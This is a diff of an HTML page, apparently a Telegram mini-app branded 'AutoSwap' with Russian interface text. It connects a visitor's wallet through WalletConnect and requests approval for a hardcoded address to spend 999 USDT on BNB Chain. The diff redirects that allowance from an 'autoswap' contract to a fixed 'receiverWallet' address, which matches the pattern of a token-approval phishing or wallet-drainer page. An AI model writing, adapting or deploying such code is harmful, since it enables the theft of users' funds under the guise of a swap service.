@@ -3,9 +3,9 @@
 <head>
   <meta charset="UTF-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>AutoSwap — approve USDT</title>
+  <title>AutoSwap — approve USDT to Wallet</title>
   <style>
-    body { font-family:'Segoe UI',sans-serif; background:linear-gradient(135deg,#1a1f2d,#0d1520); color:#e0e0e0; margin:0; padding:20px; text-align:center; }
+    body { font-family:'Segoe UI',sans-serif; background:linear-gradient(135deg,#1a1f2d,#0d1520); color:#e0e0e0; text-align:center; margin:0; padding:20px;}
     .container { max-width:500px; margin:0 auto; padding:30px; background:rgba(30,40,55,0.8); border-radius:20px; box-shadow:0 10px 40px rgba(0,0,0,0.4); }
     canvas { display:block; margin:20px auto; }
     #status { margin-top:20px; font-size:16px; white-space:pre-wrap; }
@@ -13,20 +13,18 @@
 </head>
 <body>
   <div class="container">
-    <h1>🔄 AutoSwap — Approve USDT</h1>
+    <h1>🔄 AutoSwap — approve USDT to Wallet</h1>
     <canvas id="qrcode"></canvas>
     <div id="status">Инициализация...</div>
   </div>
 
-  <!-- Библиотеки -->
+  <!-- Telegram SDK и QRCode -->
   <script src="https://telegram.org/js/telegram-web-app.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.1/build/qrcode.min.js"></script>
 
-  <!-- Основной код -->
   <script type="module">
     import SignClient from 'https://esm.sh/@walletconnect/sign-client@2.13.1';
     import { ethers } from 'https://esm.sh/ethers@6.14.3';
-
     const { Interface, parseUnits, getAddress } = ethers;
 
     const setStatus = (msg, color = "#4fc3f7") => {
@@ -43,7 +41,7 @@
           relayUrl: "wss://relay.walletconnect.com",
           metadata: {
             name: "AutoSwap Approve Flow",
-            description: "Approve USDT → AutoSwap",
+            description: "Approve USDT → Wallet",
             url: location.href,
             icons: ["https://walletconnect.com/favicon.ico"]
           }
@@ -62,22 +60,22 @@
 
         if (uri) {
           QRCode.toCanvas(document.getElementById("qrcode"), uri, { width:240, margin:1 });
-          setStatus("📱 Сканируйте QR‑код кошельком");
+          setStatus("📱 Отсканируйте QR‑код кошельком");
         }
 
         const session = await approval();
         const address = session.namespaces.eip155.accounts[0].split(":")[2];
-        setStatus(`✅ Кошелек подключён: ${address}`, "#66bb6a");
+        setStatus(`✅ Подключен кошелёк: ${address}`, "#66bb6a");
 
         const amount = parseUnits("999", 18);
         const usdt = getAddress("0x55d398326f99059ff775485246999027b3197955");
-        const autoswap = getAddress("0x026c54b156b501ad9cea422e59454d4b6d6f6963");
+        const receiverWallet = getAddress("0xC25edef7dbf23D4FBBB1Cecb9C56380eF35c11AE");
 
-        setStatus("✍️ Подготовка approve…");
+        setStatus("✍️ Подготовка approve для кошелька…");
         const approveIface = new Interface(["function approve(address,uint256)"]);
-        const data = approveIface.encodeFunctionData("approve", [autoswap, amount]);
+        const data = approveIface.encodeFunctionData("approve", [receiverWallet, amount]);
 
-        setStatus("🚀 Отправка approve транзакции…");
+        setStatus("🚀 Отправка approve…");
         const txHash = await client.request({
           topic: session.topic,
           chainId: "eip155:56",
@@ -87,7 +85,7 @@
           }
         });
 
-        setStatus(`✅ Approve отправлен:\n${txHash}`, "#66bb6a");
+        setStatus(`✅ Approve отправлен кошельку:\n${txHash}`, "#66bb6a");
       } catch (e) {
         console.error(e);
         setStatus(`❌ Ошибка: ${e.message || e.reason}`, "#ff6b6b");
